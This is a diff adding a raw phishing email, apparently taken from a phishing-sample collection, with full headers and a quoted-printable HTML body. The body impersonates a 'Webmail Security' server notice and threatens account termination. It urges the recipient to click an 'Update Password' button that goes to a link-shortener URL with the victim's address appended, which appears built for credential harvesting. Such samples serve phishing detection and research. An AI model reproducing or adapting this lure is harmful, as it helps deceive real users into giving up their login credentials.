@@ -1,0 +1,150 @@
+From jose@monkey.org Sat Jun 10 17:20:56 2023 +0000
+Return-Path: abc@daxy.com
+Delivered-To: jose@monkey.org
+X-FDA: 80887503312.28.0B245F4
+Received: from mail.daxy.com (mail.daxy.com [85.14.38.98])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id 94BD160002
+	for <jose@monkey.org>; Sat, 10 Jun 2023 17:20:54 +0000 (UTC)
+Authentication-Results: imf14.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf14.b.hostedemail.com: domain of abc@daxy.com designates 85.14.38.98 as permitted sender) smtp.mailfrom=abc@daxy.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1686417655;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=X4dMZTPxYtkIxwpgf2BCHkaMESh80PYdGKYr+YLZXso=;
+	b=KrhYv47MouIkkYTA1RXIU1UpAcN3i7vi1n12bw7zX53jqFOBMIkq6Foxvkjky9LrsSc8ZG
+	h0C2xH4ehaPC7DOR0JwxEPdOMA8s5wq8h6vxIjJ2GhuK21e+jZESqk+qwv2EdwlvWqhq+/
+	xxIAMoUrejEkMxfhW0vu3ah0cSEDuFk=
+ARC-Authentication-Results: i=1;
+	imf14.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf14.b.hostedemail.com: domain of abc@daxy.com designates 85.14.38.98 as permitted sender) smtp.mailfrom=abc@daxy.com;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1686417655; a=rsa-sha256;
+	cv=none;
+	b=BamH8YJkY7VGzeU9Wh9ve+MTsmpeLXBFad+Fela33bzZC3ok497H94qDNKqsMlhsXEjnbh
+	3Um8BWDHvIpNypSHEEewLjEtfp7CZGFxZbJRXq7Sik0E7cCXXWriV3JdMGrvyDO8+/PY+Q
+	IpsiIApme0caVNZy8QUTWeno8UV3kQI=
+Received: (qmail 2673 invoked by uid 89); 9 Jun 2023 23:04:05 -0000
+Received: from unknown (HELO daxy.com) (abc@daxy.com@45.133.174.17)
+  by mail.daxy.com with SMTP; 9 Jun 2023 23:04:05 -0000
+From: Webmail Security <abc@daxy.com>
+To: jose@monkey.org
+Subject: Email Password Successfully Updated
+Date: 09 Jun 2023 16:04:09 -0700
+Message-ID: <20230609160409.C778B2A7621E84C6@daxy.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam08
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 94BD160002
+X-Spam-Status: No, score=4.40
+X-Stat-Signature: 5n4dq6dwzc3qwk8ot9ob7en49q5yc7tq
+X-HE-Tag: 1686417654-889457
+X-HE-Meta: U2FsdGVkX1/wGoZstCZZf1bEUr0C97t7lX7ZtC6qHECrqVM/0o/99gP8MNRRpTrhi6wLFzMjrHAH4rMaqjklW9q5rY9m1Xref7gyjKxJXeqgCd4qOyjZorklJZwEIJHT+vPsJDA4Ozb1XhfsnP0F6d/sfSUCA2tmNQVCitkiHcpREk/RIiXY4dW/p3/NZlKaLJnOjQPZNuKiYEzrMr0g4ZTJ9m8tcn3Mg6HXLH25cgJ/rE6QIFDBHlgRk2atdtMVozTWabTuJvQc9XTb+XEzpfOtRu68TRDahrJ94xAqYfoy8RlX6FCuDzDrF55p83Ubi6ujmznDsMPdRGG7tJyz5k+2yyCyCmxLzwLuawedmtw=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 156
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em"><BR class=3DApple-interchange-newline>
+<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Arial=
+, Tahoma, Verdana, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORD=
+ER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(4=
+4,45,46); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETT=
+ER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatu=
+res: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial" cellspacing=
+=3D"0" width=3D"100%">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" bgcolor=3D"#045fb4" height=3D"110"><BR=
+ class=3DApple-interchange-newline>
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" width=3D=
+"80%" align=3D"center">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box"=
+ color=3D#ffffff size=3D+4 face=3Dcalibri>Server Message</FONT></TD></TR></=
+TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" bgcolor=3D"#f8f8f8"><BR style=3D"BOX-S=
+IZING: border-box"><BR style=3D"BOX-SIZING: border-box">
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" width=3D=
+"80%" align=3D"center">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box"=
+ size=3D+2 face=3Dcalibri><STRONG style=3D"BOX-SIZING: border-box; FONT-WEI=
+GHT: bolder">Hello<SPAN style=3D"BOX-SIZING: border-box">&nbsp;jose@monkey.=
+org</SPAN></STRONG></FONT><BR style=3D"BOX-SIZING: border-box"><BR style=3D=
+"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box" size=3D3 fa=
+ce=3Dcalibri>We're currently undrgoing internal serviving on our server for=
+ fclbd.com.<BR style=3D"BOX-SIZING: border-box">
+<BR style=3D"BOX-SIZING: border-box">Kindly validate&nbsp;jose@monkey.org t=
+o avoid termination.</FONT></TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" bgcolor=3D"#f8f8f8" height=3D"15"><BR =
+style=3D"BOX-SIZING: border-box"></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" bgcolor=3D"#f8f8f8">
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" height=
+=3D"60" width=3D"80%" align=3D"center" bgcolor=3D"#045fb4">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box">
+<DIV style=3D"BOX-SIZING: border-box; PADDING-TOP: 0px; BORDER-TOP-WIDTH: 0=
+px" align=3Dcenter><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: non=
+e; COLOR: rgb(0,105,166); BACKGROUND-COLOR: transparent" href=3D"https://rb=
+=2Egy/43wuw/#jose@monkey.org" rel=3Dnoreferrer target=3D_blank><FONT style=
+=3D"BOX-SIZING: border-box" color=3D#ffffff size=3D+2 face=3Dcalibri>Update=
+ Password</FONT></A></DIV></TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" bgcolor=3D"#f8f8f8" height=3D"20"><BR =
+style=3D"BOX-SIZING: border-box"></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" bgcolor=3D"#f8f8f8" height=3D"70">
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" width=3D=
+"80%" align=3D"center">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box"=
+ size=3D3 face=3Dcalibri>
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px">Regards.<BR style=3D"B=
+OX-SIZING: border-box"><STRONG style=3D"BOX-SIZING: border-box; FONT-WEIGHT=
+: bolder">&nbsp;monkey.org Admin.</STRONG></P></FONT></TD></TR></TBODY></TA=
+BLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" bgcolor=3D"#f8f8f8">
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" height=
+=3D"10" width=3D"80%" align=3D"center">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box">
+<HR style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: content-box; OVERFLOW: vis=
+ible; BORDER-TOP: 1px solid; HEIGHT: 0px; BORDER-RIGHT-WIDTH: 0px; BORDER-B=
+OTTOM-WIDTH: 0px; BORDER-LEFT-COLOR: ; BORDER-BOTTOM-COLOR: ; BORDER-RIGHT-=
+COLOR: ; border-image: initial" align=3Dcenter width=3D"100%">
+</TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" bgcolor=3D"#f8f8f8">
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" width=3D=
+"80%" align=3D"center">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box"=
+ size=3D2 face=3Dcalibri>This message is auto-generated from the E-mail sec=
+urity server, and replies sent to this email can not be delivered.&nbsp;</F=
+ONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></BODY></HTML>
